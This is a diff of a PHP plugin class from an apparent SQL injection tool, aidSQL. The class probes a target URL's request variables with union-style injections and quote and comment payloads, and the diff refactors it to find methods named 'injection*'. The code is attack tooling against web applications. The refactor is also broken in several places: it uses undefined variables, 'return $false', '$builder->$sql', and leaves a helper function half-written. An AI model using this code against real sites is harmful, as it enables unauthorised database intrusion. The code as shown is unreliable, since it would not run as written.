@@ -16,12 +16,15 @@
 
 			protected 	$_parser						=	NULL;
 			protected	$_config						=	NULL;
+			protected	$_injectionMethodString	=	"injection";
+			protected	$_injectionMethods		=	array();
+			protected	$_queryCount				=	array("someInjectionMethod"=>0);
+			protected	$_lastQuery					=	NULL;
+			protected	$_queryResult				=	NULL;
 
 			//Injection related stuff
 
 			protected 	$_injectionAttempts		=	40;
-			protected	$_fieldPayloads			=	array('',"'", "%'","')","%')");
-			protected	$_queryBuilder				=	NULL;
 
 			//Shell related stuff
 			protected	$_shellCode					=	NULL;
@@ -35,22 +38,62 @@
 
 			public final function __construct(\aidSQL\http\Adapter $adapter,Array $config,\aidSQL\core\Logger &$log=NULL){
 
-				$url	=	$adapter->getUrl();
+				$this->getInjectionMethods();
 
-				$this->_queryBuilder	=	new \aidSQL\core\QueryBuilder();
-
-				if(!$url->getQueryAsArray()){
-					throw(new \Exception("Unable to perform injection without any request variables set in the http adapter!"));
+				if(!sizeof($this->_injectionMethods)){
+					throw (new \Exception("No injection methods were found in this plugin!"));
 				}
 
-				$this->_httpAdapter = $adapter;
+				$url						=	$adapter->getUrl();
+				$requestVariables		=	$url->getQueryAsArray();
+
+				if(!sizeof($requestVariables)){
+
+					throw(new \Exception("Unable to perform injection without any request variables set in the http adapter!"));
+
+				}
+
+				$this->setConfig($config);
+
+				$keys						=	array_keys($config);
+				
+				if(in_array("numeric-only",$keys)){
+
+					$requestVariables	=	$this->separateRequestVariablesByType($requestVariables,"numeric");
+					$url->addRequestVariables($requestVariables);
+
+				}elseif(in_array("strings-only",$keys)){
+
+					$requestVariables	=	$this->separateRequestVariablesByType($requestVariables,"string");
+					$url->addRequestVariables($requestVariables);
+
+				}
+
+				$adapter->setUrl($url);
+
+				$this->setHttpAdapter($adapter);
 
 				if(!is_null($log)){
 					$this->setLog($log);
 				}
 
-				$this->setConfig($config);
 
+			}
+
+			public function isVulnerable(){
+
+				foreach($this->_injectionMethods as $injectionMethod){
+					$this->$injectionMethod();
+				}
+
+			}
+
+			public function setAffectedURLVariable($var){
+				$this->_affectedUrlVariable	=	$var;
+			}
+
+			public function getAffectedURLVariable(){
+				return $this->_affectedUrlVariable;
 			}
 
 			public function setShellCode($shellCode=NULL){
@@ -134,162 +177,71 @@
 
 			}
 
-			/**
-			*Checkout if the given URL by the HttpAdapter is vulnerable or not
-			*This method combines execution
-			*/
+			public function getInjectionMethods($nocache=FALSE){
 
-			public function isVulnerable(){
-
-				$url			=	$this->_httpAdapter->getUrl();
-				$vars			=	$url->getQueryAsArray();
-				$vars			=	$this->orderRequestVariables($vars);
-				$found		=	FALSE;
-
-				$keys	=	array_keys($this->_config);
-
-				if(in_array("numeric-only",$keys)){
-
-					$vars	=	$vars["numeric"];
-
-				}elseif(in_array("strings-only",$keys)){
-
-					$vars	=	$vars["strings"];
-
-				}else{	//Default, use both
-
-					$vars	=	array_merge($vars["numeric"],$vars["strings"]);
-
+				if(sizeof($this->_injectionMethods)){
+					return $this->_injectionMethods;
 				}
 
-				//Start offset, use it when you know the amount of fields involved in the union injection
+				$methods				=	get_class_methods($this);
+				$injectionMethods	=	array();
 
-				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
+				foreach($methods as $method){
 
-				if(!$offset){
-					throw(new \Exception("Start offset should be an integer greater than 0!"));
-				}
+					if(substr($method,0,strlen($this->_injectionMethodString))==$this->_injectionMethodString){
 
-
-				foreach($vars as $variable=>$value){
-
-					$iterationContainer	=	array();
-
-					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){
-
-						$iterationContainer[]	=	$maxFields;
-
-						$this->log("[$variable] Attempt:\t$maxFields",0,"light_cyan");
-
-						foreach($this->_fieldPayloads as $payLoad){
-
-							foreach($this->_commentPayloads as $terminating){
-
-								$injection		=	$this->generateInjection($value.$payLoad,$iterationContainer,$terminating["open"]);
-								$result			=	$this->query($variable,$injection);
-
-								if($this->_parser->analyze($result)){
-
-									$this->_affectedUrlVariable($variable);
-									return TRUE;
-
-								}
-
-							}
-
-						}
+						$injectionMethods[]	=	$method;
 
 					}
 
-					$url	=	$this->_httpAdapter->getUrl();
-
-					//Restore value if we couldnt find the vulnerable field
-					$url->addRequestVariable($variable,$value); 
-					$this->_httpAdapter->setUrl($url);
-
 				}
 
-				return FALSE;
-
+				$this->_injectionMethods	=	$injectionMethods;
+						
 			}
 
+			protected function query(\aidSQL\core\QueryBuilder $builder,$injectionMethod=NULL){
 
-			private function generateInjection($fieldValue,Array $values,$terminating=NULL){
-
-				foreach($values as &$value){
-					$value	=	$this->wrap($value);
+				if(empty($this->_affectedUrlVariable)){
+					throw (new \Exception("Query error: Cannot execute query with no affected url variable set!"));
 				}
 
-				$injection	=	$fieldValue																	.
-									$this->_space																.
-									preg_replace("/\s/",$this->_space,$this->_injectionString)	.
-									$this->_space																.
-									implode($values,$this->_fieldDelimiter);
-
-				if(!empty($this->_order["field"])){
-
-					$injection.=$this->_space;
-					$injection.="ORDER".$this->_space."BY".$this->_space.$this->_order["field"];
-
-					if(!empty($this->_order["sort"])){
-						$injection.=$this->_space.$this->_order["sort"];
-					}
-
-					$order	=	TRUE;
-
+				if(!is_a($this->_parser,"\\aidSQL\\core\\ParserInterface")){
+					throw (new \Exception("Query error: Cannot execute query with no parser make sure your parser complies with the ParserInterface!"));
 				}
 
-				if(sizeof($this->_limit)){
-
-					if($order){
-						$injection.=$this->_space;
-					}
-
-					$injection	.=	implode($this->_limit,',');
-
+				if(!in_array($injectionMethod,$this->_injectionMethods)){
+					throw (new \Exception("Injection method $injectionMethod was not found in this plugin!"));
 				}
 
-				if(!empty($terminating)){
-					$injection	.=	$this->_space.$terminating;
-				}
+				$this->_lastQuery	=	$builder;
+				$count				=	$this->_queryCount[$injectionMethod]++;
 
-				return $injection;
+				$this->log("[$variable] Attempt:\t$count",0,"light_cyan");
 
-			}
-
-
-			protected function query(\aidSQL\core\QueryBuilder $builder,$variable=NULL){
-
-				echo $builder->getSQL();
-				die();
-				if(empty($variable)){
-
-					if(empty($this->_affectedUrlVariable)){
-
-						throw (new \Exception("Cannot make query with no affected url variable set!"));
-
-					}else{
-
-						$variable	=	$this->_affectedUrlVariable;
-
-					}
-
-				}
+				$sql	=	$builder->getSQL();
 
 				$this->log("QUERY: $sql");
 
 				$url	=	$this->_httpAdapter->getUrl();
-				$url->addRequestVariable($variable,$sql);
+
+				$url->addRequestVariable($this->_affectedUrlvariable,$builder->$sql);
+
 				$this->_httpAdapter->setUrl($url);
 
 				try{
 
-					$content = $this->_httpAdapter->fetch();
+					$content					=	$this->_httpAdapter->fetch();
+					$this->_queryResult	=	$content;
 
-					if($content===FALSE){
+					if($this->_verbose){
+						$this->log($content);
+					}
 
-							$this->log("No content you have to modify the http adapter in order to retry on server error ...");
+					$result	=	$this->_parser->analyze($content);
 
+					if($result){
+						return $result;
 					}
 
 				}catch(\Exception $e){
@@ -298,15 +250,11 @@
 
 				}
 
-				if($this->_verbose){
-					$this->log($content);
-				}
-
-				return $content;
+				return $false;
 
 			}
 
-			public function setHttpAdapter(aidSQL\http\Adapter $adapter){
+			public function setHttpAdapter(\aidSQL\http\Adapter $adapter){
 				$this->_httpAdapter = $adapter;
 			}
 
@@ -350,7 +298,7 @@
 				return $this->_parser;
 			}
 
-			private function orderRequestVariables(Array $requestVariables){
+			private function separateRequestVariablesByType(Array $requestVariables,$type){
 
 				$numVariables	=	array();
 				$strVariables	=	array();
@@ -365,7 +313,39 @@
 
 				}
 
-				return array("strings"=>$strVariables,"numeric"=>$numVariables);
+				switch(strtolower($type)){
+
+					case "numeric":
+						return $numVariables;
+						break;
+
+					case "string":
+						return $strVariables;
+						break;
+
+					default:
+						return array_merge($numVariables,$strVariables);
+						break;
+
+				}
+
+			}
+
+			private function orderRequestVariables(){
+
+
+				if(in_array("numeric-only",$keys)){
+
+
+				}elseif(in_array("strings-only",$keys)){
+
+					$strings	=	$vars["strings"];
+
+				}else{
+
+					return $requestVariables;
+
+				}
 
 			}
 
